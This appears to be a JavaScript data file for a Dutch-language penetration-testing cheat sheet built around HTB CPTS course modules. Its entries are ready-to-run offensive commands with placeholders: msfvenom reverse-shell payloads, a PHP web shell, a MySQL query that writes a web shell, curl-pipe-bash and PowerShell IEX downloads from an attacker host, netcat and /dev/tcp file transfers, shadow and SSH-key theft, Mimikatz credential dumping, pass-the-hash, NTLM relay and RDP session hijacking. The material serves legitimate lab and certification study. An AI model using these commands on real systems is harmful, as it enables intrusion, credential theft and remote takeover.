    { title: 'Remote access: RDP · 3389 / WinRM · 5985 / SSH · 22', items: [
      { h: 'RDP verbinden', tags: ['rdp', '3389'],
        code: `xfreerdp /v:{{IP}} /u:{{USER}} /p:'{{PASS}}' /cert:ignore +clipboard /dynamic-resolution` },
      { h: 'WinRM shell (evil-winrm)', tags: ['winrm', '5985', 'must-know'],
        d: 'De prettigste Windows-shell. Werkt met wachtwoord óf NTLM-hash (pass-the-hash).',
        code: `evil-winrm -i {{IP}} -u {{USER}} -p '{{PASS}}'\nevil-winrm -i {{IP}} -u {{USER}} -H <NTLM-hash>` },
      { h: 'SSH', tags: ['ssh', '22'],
        d: 'Let op oude algoritmes en key-based auth. Met een gevonden private key: <code>chmod 600 key; ssh -i key user@ip</code>.',
        code: `ssh {{USER}}@{{IP}}\nssh -i id_rsa {{USER}}@{{IP}}\n# host-key/alg problemen forceren:\nssh -o StrictHostKeyChecking=no -o PubkeyAcceptedAlgorithms=+ssh-rsa {{USER}}@{{IP}}` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   INFORMATION GATHERING — WEB
══════════════════════════════════════════════════════════════ */
{
  id: 'web', cat: 'Enumeratie & Recon', icon: 'web', name: 'Information Gathering — Web',
  desc: 'Web recon: fingerprinting, subdomeinen, virtual hosts, content-discovery.',
  tier: 'Tier II', diff: 'Easy', done: true,
  intro: 'Voordat je een webapp aanvalt, moet je weten wat je voor je hebt: welke technologie, welke subdomeinen en virtual hosts bestaan, en welke verborgen paden er zijn. Veel HTB-webapps luisteren alleen op hun <b>hostname</b> — vergeet je de <code>/etc/hosts</code>-regel, dan krijg je een lege pagina en denk je onterecht dat er niets is. Begin daar altijd mee.',
  groups: [
    { title: 'Setup & fingerprinting', items: [
      { h: '/etc/hosts entry toevoegen', tags: ['web', 'setup', 'must-know'],
        d: 'Koppel de hostname aan het IP. Zonder dit werken vhost-gebaseerde apps niet. Voeg ook gevonden subdomeinen toe.',
        code: `echo "{{IP}} {{DOMAIN}} www.{{DOMAIN}}" | sudo tee -a /etc/hosts` },
      { h: 'Tech-stack & headers', tags: ['web', 'recon'],
        d: 'Server, framework, CMS en versies. <code>whatweb</code> en de response-headers verraden vaak genoeg voor een gerichte exploit-zoektocht.',
        code: `whatweb {{URL}}\ncurl -sI {{URL}}\ncurl -s {{URL}} | grep -iE 'generator|powered|version'` },
      { h: 'robots.txt, sitemap & bronbestanden', tags: ['web', 'recon'],
        d: '<code>robots.txt</code> wijst juist naar wat men wil verbergen. Bekijk ook HTML-comments en geladen JS voor endpoints en credentials.',
        code: `curl -s {{URL}}/robots.txt\ncurl -s {{URL}}/sitemap.xml\ncurl -s {{URL}} | grep -oP '(href|src)="[^"]+"'` },
      { h: 'WAF-detectie', tags: ['web', 'recon'],
        d: 'Weten of er een Web Application Firewall voor zit bepaalt hoe agressief je kunt fuzzen.',
        code: `wafw00f {{URL}}` },
    ]},
    { title: 'Subdomeinen & virtual hosts', intro: 'Een <b>subdomein</b> heeft een eigen DNS-record; een <b>virtual host (vhost)</b> draait op hetzelfde IP en wordt onderscheiden door de Host-header. Beide kunnen verborgen apps onthullen.', items: [
      { h: 'Subdomein brute-force (ffuf)', tags: ['web', 'subdomain', 'must-know'],
        d: '<code>-fs 0</code> filtert lege responses. Filter valse positieven met <code>-fs</code>/<code>-fc</code>/<code>-fw</code> op de baseline-grootte.',
        code: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n  -u {{URL}} -H "Host: FUZZ.{{DOMAIN}}" -fs 0` },
      { h: 'Virtual host discovery (gobuster)', tags: ['web', 'vhost'],
        code: `gobuster vhost -u {{URL}} \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain` },
      { h: 'Passief via certificate transparency', tags: ['web', 'osint'],
        d: 'crt.sh geeft subdomeinen uit uitgegeven TLS-certificaten — zonder één pakket naar het target.',
        code: `curl -s "https://crt.sh/?q=%25.{{DOMAIN}}&output=json" | jq -r '.[].name_value' | sort -u` },
    ]},
    { title: 'Content discovery', intro: 'Zoek verborgen mappen, bestanden en parameters. Kies je wordlist op de tech-stack (bv. raft-lijsten, of taal-specifiek).', items: [
      { h: 'Directory brute-force (ffuf)', tags: ['web', 'fuzz', 'must-know'],
        d: '<code>-e</code> voegt extensies toe, <code>-ac</code> (auto-calibrate) filtert automatisch de ruis van soft-404s.',
        code: `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -u {{URL}}/FUZZ -e .php,.txt,.html,.bak -ac` },
      { h: 'Recursief (feroxbuster)', tags: ['web', 'fuzz'],
        d: 'Duikt automatisch gevonden mappen in. Handig, maar kan luid zijn — gebruik <code>-d</code> voor dieptelimiet.',
        code: `feroxbuster -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -d 2` },
      { h: 'Parameters fuzzen', tags: ['web', 'fuzz'],
        d: 'Verborgen GET-parameters vinden — vaak de ingang naar LFI, IDOR of SQLi.',
        code: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\\n  -u "{{URL}}/page.php?FUZZ=test" -fs 0` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   VULNERABILITY ASSESSMENT
══════════════════════════════════════════════════════════════ */
{
  id: 'vuln', cat: 'Enumeratie & Recon', icon: 'vuln', name: 'Vulnerability Assessment',
  desc: 'Van scan-output naar exploiteerbare kwetsbaarheden — searchsploit, CVE, prioriteren.',
  tier: 'Tier 0', diff: 'Easy', done: true,
  intro: 'Vulnerability assessment is de brug tussen enumeratie en exploitatie: je koppelt gevonden <b>service + versie</b> aan bekende kwetsbaarheden. Onthoud het verschil met een pentest — een assessment <i>identificeert</i>, een pentest <i>exploiteert en bewijst impact</i>. Draai nooit een publieke exploit blind: lees de code, snap wat hij doet en pas hardcoded IP\'s/poorten aan.',
  groups: [
    { title: 'Exploits zoeken', items: [
      { h: 'searchsploit op service/versie', tags: ['exploit', 'must-know'],
        d: 'De offline Exploit-DB. <code>-x</code> bekijkt een exploit, <code>-m</code> kopieert hem naar je huidige map.',
        code: `searchsploit apache 2.4.49\nsearchsploit -x php/webapps/50383.py\nsearchsploit -m php/webapps/50383.py` },
      { h: 'CVE opzoeken', tags: ['analysis'],
        code: `searchsploit --cve 2021-41773` },
    ]},
    { title: 'Geautomatiseerd scannen', intro: 'Scanners geven richting, maar produceren ruis en false positives. Verifieer elke bevinding handmatig.', items: [
      { h: 'Nikto (web)', tags: ['web', 'scan'],
        code: `nikto -h {{URL}} -o scans/nikto.txt` },
      { h: 'nmap vuln-scripts', tags: ['scan'],
        code: `sudo nmap -sV --script vuln {{IP}} -oA scans/vuln` },
    ]},
    { title: 'Prioriteren & rapporteren', items: [
      { h: 'Van bevinding naar plan', tags: ['methodology'],
        d: 'Weeg per kwetsbaarheid <b>exploiteerbaarheid</b> (publieke PoC? auth nodig?), <b>betrouwbaarheid</b> (crasht de service?) en <b>impact</b>. Kies de rustigste, meest betrouwbare weg naar toegang eerst.',
        note: { type: 'warn', text: 'Publieke exploits kunnen backdoors of destructieve payloads bevatten. <b>Lees altijd de broncode</b> en test in een veilige omgeving. Ken je {{LHOST}}/{{LPORT}} en vervang hardcoded waardes.' } },
      { h: 'CVSS begrijpen', tags: ['concept'],
        d: 'CVSS-score (0-10) meet ernst, niet exploiteerbaarheid in jouw context. Een "medium" met publieke exploit en directe RCE is gevaarlijker dan een "critical" die interne toegang vereist.' },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   FILE TRANSFERS
══════════════════════════════════════════════════════════════ */
{
  id: 'transfer', cat: 'Toegang & Payloads', icon: 'transfer', name: 'File Transfers',
  desc: 'Tools van en naar het target — Linux en Windows, met en zonder internet.',
  tier: 'Tier 0', diff: 'Medium', done: true,
  intro: 'Zodra je een shell hebt, moet je tools naar het target krijgen (linpeas, nc, exploits) en loot terug naar jezelf (hashes, keys, config). Welke methode werkt hangt af van het OS en wat er beschikbaar is. Ken minstens twee methodes per OS uit je hoofd, want vaak zijn <code>wget</code>/<code>curl</code> of PowerShell-downloads geblokkeerd.',
  groups: [
    { title: 'Server draaien op de attacker', items: [
      { h: 'HTTP-server (download)', tags: ['host', 'must-know'],
        d: 'De meest gebruikte methode. Serveer je huidige map op poort 80.',
        code: `python3 -m http.server 80\n# ontvangt ook uploads (PUT/POST):\npython3 -m uploadserver 80` },
      { h: 'SMB-server (Windows-vriendelijk)', tags: ['host', 'smb', 'must-know'],
        d: 'Nieuwere Windows weigert gast-SMB; gebruik dan de variant met credentials.',
        code: `impacket-smbserver share . -smb2support\nimpacket-smbserver share . -smb2support -user u -password p` },
      { h: 'Snelle nc-overdracht', tags: ['host'],
        d: 'Zonder webserver: luister op de attacker, stuur vanaf het target.',
        code: `# attacker (ontvangen):\nnc -lvnp {{LPORT}} > uit.bin\n# target (versturen):\nnc -q0 {{LHOST}} {{LPORT}} < bestand` },
    ]},
    { title: 'Download naar Linux', items: [
      { h: 'wget / curl', tags: ['linux', 'download', 'must-know'],
        d: '<code>curl | bash</code> draait een script zonder het op schijf te schrijven (minder sporen, ontwijkt sommige AV).',
        code: `wget http://{{LHOST}}/linpeas.sh -O /tmp/lp.sh\ncurl http://{{LHOST}}/linpeas.sh -o /tmp/lp.sh\ncurl http://{{LHOST}}/linpeas.sh | bash` },
      { h: 'Zonder wget/curl (bash /dev/tcp)', tags: ['linux', 'download'],
        code: `exec 3<>/dev/tcp/{{LHOST}}/80\necho -e "GET /file HTTP/1.1\\r\\nHost: {{LHOST}}\\r\\n\\r\\n" >&3\ncat <&3` },
    ]},
    { title: 'Download naar Windows', items: [
      { h: 'PowerShell download', tags: ['windows', 'download', 'must-know'],
        d: '<code>IEX(...)DownloadString</code> draait in-memory (fileless). <code>DownloadFile</code> schrijft naar schijf.',
        code: `IEX(New-Object Net.WebClient).DownloadString("http://{{LHOST}}/script.ps1")\n(New-Object Net.WebClient).DownloadFile("http://{{LHOST}}/nc.exe","C:\\Windows\\Temp\\nc.exe")\nInvoke-WebRequest -Uri http://{{LHOST}}/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe` },
      { h: 'certutil / SMB', tags: ['windows', 'download'],
        d: '<code>certutil</code> is een LOLBIN dat vaak niet geblokkeerd is. SMB werkt als je een impacket-smbserver draait.',
        code: `certutil -urlcache -split -f http://{{LHOST}}/nc.exe nc.exe\ncopy \\\\{{LHOST}}\\share\\nc.exe C:\\Windows\\Temp\\nc.exe` },
    ]},
    { title: 'Encode / geen netwerk', items: [
      { h: 'Base64 kopiëren-plakken', tags: ['offline'],
        d: 'Werkt over elke shell zonder file-transfer. Encode op de attacker, decode op het target. Handig voor kleine bestanden of als downloads geblokkeerd zijn.',
        code: `# attacker:\ncat file | base64 -w0; echo\n# Linux target:\necho "<base64>" | base64 -d > file\n# Windows target:\n[IO.File]::WriteAllBytes("file.exe",[Convert]::FromBase64String("<base64>"))` },
      { h: 'Integriteit checken', tags: ['offline'],
        d: 'Na een transfer via base64/plakken: verifieer de hash aan beide kanten.',
        code: `md5sum file          # linux\nGet-FileHash file -Algorithm MD5   # windows` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   SHELLS & PAYLOADS
══════════════════════════════════════════════════════════════ */
{
  id: 'shells', cat: 'Toegang & Payloads', icon: 'shells', name: 'Shells & Payloads',
  desc: 'Payloads genereren met msfvenom, listeners opzetten, web shells en stabilisatie.',
  tier: 'Tier I', diff: 'Medium', done: true,
  intro: 'Een payload is de code die na exploitatie draait om je een shell te geven. <b>msfvenom</b> genereert ze voor elk OS en formaat. Ken het verschil tussen <b>staged</b> (payload in delen, <code>windows/x64/meterpreter/reverse_tcp</code>) en <b>stageless</b> (alles-in-één, <code>..._reverse_tcp</code> zonder tussenslash) — staged heeft de multi/handler nodig, stageless werkt met kale netcat.',
  groups: [
    { title: 'msfvenom payloads', intro: 'Vaste vorm: <code>-p &lt;payload&gt; LHOST= LPORT= -f &lt;formaat&gt; -o &lt;bestand&gt;</code>. Voeg <code>-e</code>/<code>-i</code> toe voor encoding tegen simpele AV.', items: [
      { h: 'Windows executable', tags: ['msfvenom', 'windows', 'must-know'],
        code: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe` },
      { h: 'Windows meterpreter (staged)', tags: ['msfvenom', 'windows'],
        d: 'Vereist de multi/handler als listener (zie Metasploit-module).',
        code: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o met.exe` },
      { h: 'Linux ELF', tags: ['msfvenom', 'linux'],
        code: `msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf` },
      { h: 'Web payloads (php/asp/jsp/war)', tags: ['msfvenom', 'web'],
        d: 'Upload op een server die de taal uitvoert. WAR deploy je op Tomcat.',
        code: `msfvenom -p php/reverse_php LHOST={{LHOST}} LPORT={{LPORT}} -f raw -o shell.php\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war -o shell.war\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f asp -o shell.asp` },
      { h: 'Payloads & formaten listen', tags: ['msfvenom'],
        code: `msfvenom --list payloads | grep windows\nmsfvenom --list formats\nmsfvenom --list encoders` },
    ]},
    { title: 'Listeners', items: [
      { h: 'netcat (voor stageless)', tags: ['listener', 'must-know'],
        code: `nc -lvnp {{LPORT}}` },
      { h: 'Metasploit multi/handler (voor staged/meterpreter)', tags: ['listener', 'msf'],
        code: `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run"` },
    ]},
    { title: 'Web shells', intro: 'Een web shell is code op de webserver die commando\'s uitvoert via een HTTP-parameter. Snel voor RCE, maar minder stabiel dan een reverse shell.', items: [
      { h: 'PHP one-liner', tags: ['webshell', 'php'],
        d: 'Upload en roep aan met <code>?cmd=id</code>. Gebruik alleen op boxes waar je toestemming hebt.',
        code: `<?php system($_GET["cmd"]); ?>` },
      { h: 'Kant-en-klare web shells', tags: ['webshell'],
        d: 'Pas de <code>$ip</code>/<code>$port</code> bovenin aan naar je {{LHOST}}/{{LPORT}} vóór upload.',
        code: `ls /usr/share/webshells/\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php\n# laudanum, antak (asp.net) en nishang bieden meer opties` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   METASPLOIT FRAMEWORK
══════════════════════════════════════════════════════════════ */
{
  id: 'msf', cat: 'Toegang & Payloads', icon: 'msf', name: 'Metasploit Framework',
  desc: 'msfconsole workflow: zoeken, configureren, exploiteren, meterpreter, pivoting.',
  tier: 'Tier 0', diff: 'Easy', done: true,
  intro: 'Metasploit versnelt exploitatie met kant-en-klare modules (<code>exploit</code>, <code>auxiliary</code>, <code>post</code>) en de krachtige <b>meterpreter</b>-payload. In het CPTS-examen mag je Metasploit maar op <b>één</b> host gebruiken — leer daarom ook de handmatige weg. Maar voor snelle wins en post-exploitation (hashdump, pivoting) is het onmisbaar.',
  groups: [
    { title: 'Basis-workflow', intro: 'De vaste lus: <code>search</code> → <code>use</code> → <code>info</code>/<code>show options</code> → <code>set</code> → <code>check</code> → <code>exploit</code>.', items: [
      { h: 'Starten & zoeken', tags: ['msf', 'must-know'],
        code: `msfconsole -q\nsearch type:exploit platform:windows smb\nuse exploit/windows/smb/ms17_010_eternalblue\ninfo\nshow options` },
      { h: 'Configureren & runnen', tags: ['msf', 'must-know'],
        d: '<code>RHOSTS</code> = target, <code>LHOST</code>/<code>LPORT</code> = jouw kant. <code>check</code> test veilig of het target kwetsbaar is (indien ondersteund).',
        code: `set RHOSTS {{IP}}\nset LHOST {{LHOST}}\nset LPORT {{LPORT}}\ncheck\nexploit` },
      { h: 'Payload wisselen', tags: ['msf'],
        code: `show payloads\nset payload windows/x64/meterpreter/reverse_tcp` },
    ]},
    { title: 'Sessies & meterpreter', items: [
      { h: 'Sessiebeheer', tags: ['msf', 'session'],
        code: `sessions -l\nsessions -i 1\nbackground        # (of Ctrl-Z) terug naar msf-prompt` },
      { h: 'Meterpreter essentials', tags: ['meterpreter', 'must-know'],
        code: `sysinfo\ngetuid\ngetprivs\nhashdump\nshell             # naar OS-shell\nupload lp.sh /tmp/lp.sh\ndownload C:\\Users\\Administrator\\Desktop\\root.txt` },
      { h: 'Privesc & credential-dumping', tags: ['meterpreter', 'privesc'],
        d: '<code>getsystem</code> probeert bekende privesc-technieken. <code>kiwi</code> is mimikatz in-memory.',
        code: `getsystem\nload kiwi\ncreds_all\nlsa_dump_sam\nmigrate -N lsass.exe` },
    ]},
    { title: 'Post-exploitation & pivoting', items: [
      { h: 'Local exploit suggester', tags: ['msf', 'privesc', 'must-know'],
        d: 'Draait vanuit een sessie en stelt kansrijke privesc-exploits voor het target voor.',
        code: `run post/multi/recon/local_exploit_suggester` },
      { h: 'Pivoten naar intern netwerk', tags: ['msf', 'pivot'],
        d: 'Route intern verkeer door je sessie, open dan een SOCKS-proxy voor je andere tools (via proxychains).',
        code: `run autoroute -s 172.16.5.0/24\nbackground\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun` },
      { h: 'Resource scripts', tags: ['msf', 'workflow'],
        d: 'Automatiseer herhaalbare stappen (bv. een handler opzetten) in een <code>.rc</code>-bestand.',
        code: `msfconsole -q -r handler.rc` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   PASSWORD ATTACKS
══════════════════════════════════════════════════════════════ */
{
  id: 'pass', cat: 'Toegang & Payloads', icon: 'pass', name: 'Password Attacks',
  desc: 'Hashes kraken, services brute-forcen, spraying en credentials looten.',
  tier: 'Tier I', diff: 'Medium', done: true,
  intro: 'Wachtwoorden zijn vaak de zwakste schakel. Drie aanvalstypen: <b>hashes kraken</b> (offline, hashcat/john), <b>online brute-force</b> (hydra/netexec tegen een dienst) en <b>looten</b> (bestaande creds vinden op een systeem). In AD-omgevingen is <b>password spraying</b> (één wachtwoord tegen véél gebruikers) veiliger dan brute-force omdat het geen accounts lockt. Herbruik gevonden creds altijd overal (credential stuffing).',
  groups: [
    { title: 'Hashes kraken', intro: 'Identificeer eerst het hash-type, kies dan de juiste hashcat-mode. Rockyou + rules kraakt de meeste zwakke wachtwoorden.', items: [
      { h: 'Hash-type identificeren', tags: ['crack', 'must-know'],
        d: 'Veelgebruikte hashcat-modes: <code>0</code> MD5, <code>100</code> SHA1, <code>1000</code> NTLM, <code>1800</code> sha512crypt (Linux $6$), <code>3200</code> bcrypt, <code>13100</code> Kerberoast (TGS), <code>18200</code> AS-REP, <code>5600</code> NetNTLMv2, <code>22000</code> WPA.',
        code: `hashid '$6$xyz...'\nhashcat --identify hash.txt\nname-that-hash -t hash.txt` },
      { h: 'hashcat — wordlist + rules', tags: ['crack', 'hashcat', 'must-know'],
        d: 'Rules muteren de wordlist (hoofdletters, cijfers erachter, leetspeak). <code>best64</code> is de standaard startset.',
        code: `hashcat -m 1000 hash.txt {{WORDLIST}}\nhashcat -m 1000 hash.txt {{WORDLIST}} -r /usr/share/hashcat/rules/best64.rule\nhashcat -m 1000 hash.txt --show` },
      { h: 'John the Ripper', tags: ['crack', 'john'],
        d: 'Handig voor het "unshadow"-en van /etc/passwd + /etc/shadow, en voor de vele <code>*2john</code>-tools (ssh2john, zip2john...).',
        code: `unshadow passwd.txt shadow.txt > unshadowed\njohn --wordlist={{WORDLIST}} unshadowed\njohn --show unshadowed\nssh2john id_rsa > sshhash && john --wordlist={{WORDLIST}} sshhash` },
    ]},
    { title: 'Online brute-force & spraying', intro: 'Let op account-lockout: brute-force van één account kan het locken. Spraying (1 wachtwoord × N users) omzeilt dat.', items: [
      { h: 'Hydra — SSH / FTP', tags: ['brute', 'hydra', 'must-know'],
        code: `hydra -l {{USER}} -P {{WORDLIST}} ssh://{{IP}}\nhydra -L users.txt -P {{WORDLIST}} ftp://{{IP}} -t 4` },
      { h: 'Hydra — HTTP POST login-form', tags: ['brute', 'hydra', 'web'],
        d: 'Vervang de faal-string (<code>F=</code>) door de exacte tekst die de pagina toont bij een foute login.',
        code: `hydra -l {{USER}} -P {{WORDLIST}} {{IP}} http-post-form \\\n  "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"` },
      { h: 'netexec — spray over SMB/WinRM', tags: ['brute', 'smb', 'must-know'],
        d: '<code>--continue-on-success</code> stopt niet bij de eerste hit. Voor spraying: veel users, één wachtwoord.',
        code: `netexec smb {{IP}} -u users.txt -p '{{PASS}}' --continue-on-success\nnetexec smb {{IP}} -u {{USER}} -p {{WORDLIST}}\nnetexec winrm {{IP}} -u users.txt -p '{{PASS}}'` },
    ]},
    { title: 'Wordlists & mutaties', items: [
      { h: 'Doelgerichte wordlist maken', tags: ['wordlist'],
        d: '<code>cewl</code> scrapt woorden van de site; <code>username-anarchy</code> genereert usernames uit namen. Combineer met rules.',
        code: `cewl -d 3 -m 6 -w custom.txt {{URL}}\nusername-anarchy -i names.txt > users.txt` },
    ]},
    { title: 'Credentials looten', intro: 'Na je eerste shell: zoek naar hergebruikbare credentials. Dit is vaak de weg naar de volgende host of naar root.', items: [
      { h: 'Linux — waar creds liggen', tags: ['loot', 'linux'],
        code: `cat /etc/passwd /etc/shadow 2>/dev/null\ngrep -riE 'password|passwd|secret|api[_-]?key' /var/www /home /opt /etc 2>/dev/null\ncat ~/.ssh/id_rsa ~/.bash_history ~/.mysql_history 2>/dev/null\nfind / -name '*.kdbx' -o -name 'id_rsa' 2>/dev/null` },
      { h: 'Windows — creds & hashes', tags: ['loot', 'windows'],
        d: '<code>secretsdump</code> dumpt SAM/LSA remote met admin-creds. <code>cmdkey</code> toont opgeslagen credentials voor runas.',
        code: `impacket-secretsdump {{USER}}:'{{PASS}}'@{{IP}}\ncmdkey /list\n# in bestanden zoeken:\nfindstr /si password *.txt *.ini *.config *.xml` },
      { h: 'Pass-the-Hash (PtH)', tags: ['loot', 'windows', 'pass-the-hash', 'must-know'],
        d: 'Met alleen de <b>NTLM-hash</b> authenticeer je zonder het wachtwoord — NTLM-auth vergelijkt de hash, niet het wachtwoord. Werkt op SMB, WinRM, psexec/wmiexec en RDP (Restricted Admin). Gebruik het <b>NT</b>-deel van een <code>LM:NT</code>-paar. Voor Kerberos-diensten: zie Pass-the-Ticket / overpass-the-hash in de AD-module.',
        code: `netexec smb {{IP}} -u {{USER}} -H <NTLM-hash>\nevil-winrm -i {{IP}} -u {{USER}} -H <NTLM-hash>\nimpacket-psexec {{USER}}@{{IP}} -hashes :<NTLM-hash>\nimpacket-wmiexec {{USER}}@{{IP}} -hashes :<NTLM-hash>\nxfreerdp /v:{{IP}} /u:{{USER}} /pth:<NTLM-hash>` },
      { h: 'NetNTLMv2 vangen met Responder', tags: ['loot', 'windows', 'creds', 'must-know'],
        d: 'Dwing een host om naar jou te authenticeren (UNC-pad, <code>xp_dirtree</code>, e-mail-link) en vang de <b>NetNTLMv2</b>-hash. Die kraak je (mode 5600) — of relay je meteen met <code>ntlmrelayx</code> als SMB-signing uit staat. Let op: NetNTLMv2 kun je <b>niet</b> pass-the-hashen.',
        code: `sudo responder -I tun0\n# vang de hash → kraken:\nhashcat -m 5600 ntlmv2.txt {{WORDLIST}}\n# of relayen (geen kraak nodig):\nimpacket-ntlmrelayx -tf targets.txt -smb2support` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   ATTACKING COMMON SERVICES
══════════════════════════════════════════════════════════════ */
{
  id: 'services', cat: 'Toegang & Payloads', icon: 'services', name: 'Attacking Common Services',
  desc: 'Van enumeratie naar exploitatie op FTP, SMB, SQL, RDP, DNS en e-mail.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Deze module bouwt op Footprinting voort: nu ga je de services daadwerkelijk <b>aanvallen</b>. De rode draad is telkens dezelfde: zwakke of standaard-credentials, misconfiguraties en features die tot code-executie leiden (zoals MSSQL <code>xp_cmdshell</code> of een schrijfbare SMB-share). Herbruik gevonden credentials op elke andere service — dat is waar het meeste rendement zit.',
  groups: [
    { title: 'SMB aanvallen', items: [
      { h: 'RCE via psexec/smbexec/wmiexec', tags: ['smb', 'rce', 'must-know'],
        d: 'Met admin-credentials op een Windows-host krijg je een SYSTEM-shell. <code>wmiexec</code> is stiller (geen service aangemaakt) dan <code>psexec</code>.',
        code: `impacket-psexec {{USER}}:'{{PASS}}'@{{IP}}\nimpacket-wmiexec {{USER}}:'{{PASS}}'@{{IP}}\nnetexec smb {{IP}} -u {{USER}} -p '{{PASS}}' -x whoami` },
      { h: 'Commando op alle hosts (mass)', tags: ['smb'],
        d: 'netexec accepteert een bestand met IP\'s — handig om gevonden lokale-admin creds breed te testen.',
        code: `netexec smb targets.txt -u {{USER}} -p '{{PASS}}' --local-auth -x whoami` },
    ]},
    { title: 'Databases aanvallen', items: [
      { h: 'MSSQL — RCE via xp_cmdshell', tags: ['mssql', 'rce', 'must-know'],
        code: `impacket-mssqlclient {{USER}}:'{{PASS}}'@{{IP}} -windows-auth\n# > enable_xp_cmdshell\n# > EXEC xp_cmdshell 'whoami'` },
      { h: 'MSSQL — hash stelen (UNC)', tags: ['mssql', 'creds'],
        d: 'Laat MSSQL naar jouw SMB-server verbinden; vang de NetNTLMv2-hash met responder en kraak of relay hem.',
        code: `# op attacker: sudo responder -I tun0\n# in mssql:\nEXEC master..xp_dirtree '\\\\{{LHOST}}\\share'` },
      { h: 'MySQL — file read/write', tags: ['mysql'],
        d: 'Met <code>FILE</code>-privilege kun je bestanden lezen of een webshell schrijven in de webroot.',
        code: `mysql -h {{IP}} -u {{USER}} -p'{{PASS}}'\n# > SELECT LOAD_FILE('/etc/passwd');\n# > SELECT '<?php system($_GET[1]);?>' INTO OUTFILE '/var/www/html/s.php';` },
    ]},
    { title: 'E-mail & DNS', items: [
      { h: 'Open relay / phishing (SMTP)', tags: ['smtp'],
        d: 'Test of de server mail doorstuurt voor externe domeinen (open relay) — misbruikbaar voor phishing in een engagement.',
        code: `sudo nmap -p25 --script smtp-open-relay {{IP}}\nswaks --to victim@{{DOMAIN}} --from admin@{{DOMAIN}} --server {{IP}}` },
      { h: 'DNS-misbruik', tags: ['dns'],
        d: 'Zone transfers (zie Footprinting) en, bij dynamische DNS, ongeautoriseerde updates die records kapen.',
        code: `dig axfr {{DOMAIN}} @{{IP}}` },
    ]},
    { title: 'RDP aanvallen', items: [
      { h: 'RDP brute-force & pass-the-hash', tags: ['rdp', 'brute'],
        code: `hydra -L users.txt -P {{WORDLIST}} rdp://{{IP}}\n# met NTLM-hash (Restricted Admin mode):\nxfreerdp /v:{{IP}} /u:{{USER}} /pth:<NTLM-hash>` },
      { h: 'RDP-sessie kapen', tags: ['rdp'],
        d: 'Als SYSTEM kun je bestaande RDP-sessies van andere gebruikers overnemen zonder hun wachtwoord.',
        code: `query user\ntscon <SESSION-ID> /dest:rdp-tcp#<eigen-id>` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   USING WEB PROXIES
══════════════════════════════════════════════════════════════ */
{
  id: 'proxies', cat: 'Web Exploitatie', icon: 'proxies', name: 'Web Proxies (Burp / ZAP)',
  desc: 'Verkeer onderscheppen, aanpassen en herhalen — de basis van elke webaanval.',
  tier: 'Tier II', diff: 'Easy', done: false,
  intro: 'Een web proxy (Burp Suite of OWASP ZAP) zit tussen je browser en het target en laat je élk request onderscheppen, aanpassen en opnieuw versturen. Dit is het fundament van webhacking: zonder proxy zie en manipuleer je alleen wat de UI toont. Leer de kernonderdelen: <b>Proxy</b> (intercept), <b>Repeater</b> (handmatig knutselen), <b>Intruder</b> (geautomatiseerd fuzzen) en <b>Decoder</b>.',
  groups: [
    { title: 'Opzet', items: [
      { h: 'Burp certificaat installeren', tags: ['burp', 'setup', 'must-know'],
        d: 'Zonder het CA-certificaat kun je geen HTTPS onderscheppen. Ga naar <code>http://burp</code> terwijl de proxy loopt, download <b>cacert.der</b> en importeer die in Firefox/FoxyProxy.',
        note: { type: 'info', text: 'Stel je browser (of FoxyProxy) in op <b>127.0.0.1:8080</b>. Gebruik bij voorkeur een aparte browser/profiel zodat je normale verkeer niet door Burp loopt.' } },
      { h: 'Scope instellen', tags: ['burp'],
        d: 'Zet het target in Target → Scope en filter alles buiten scope weg. Voorkomt ruis en dat je per ongeluk out-of-scope verkeer stuurt.' },
    ]},
    { title: 'Kernworkflow', items: [
      { h: 'Intercept & Repeater', tags: ['burp', 'must-know'],
        d: 'Vang een interessant request, stuur het met <b>Ctrl-R</b> naar Repeater, en pas daar parameters/headers aan om het gedrag te testen. De belangrijkste feedback-lus in webhacking.' },
      { h: 'Intruder (fuzzen)', tags: ['burp', 'fuzz'],
        d: 'Markeer een positie met §§, kies payload-lijst en attack-type (Sniper voor één positie, Cluster Bomb voor combinaties). Gebruik voor login brute-force, IDOR-enumeratie en parameter-fuzzing. In de Community-editie is Intruder gethrottled — voor snelheid gebruik ffuf.' },
      { h: 'Comparer & Decoder', tags: ['burp'],
        d: '<b>Decoder</b> encodet/decodeert URL, Base64, HTML. <b>Comparer</b> highlight verschillen tussen twee responses — handig om subtiele verschillen (bv. bij user-enum) te spotten.' },
    ]},
    { title: 'Proxying andere tools', items: [
      { h: 'CLI-tools door Burp sturen', tags: ['burp', 'workflow'],
        d: 'Stuur curl/nuclei/sqlmap door Burp om precies te zien wat ze versturen — onmisbaar bij debuggen.',
        code: `curl -sk --proxy http://127.0.0.1:8080 {{URL}}\nsqlmap -u "{{URL}}/?id=1" --proxy=http://127.0.0.1:8080` },
    ]}
  ]
},

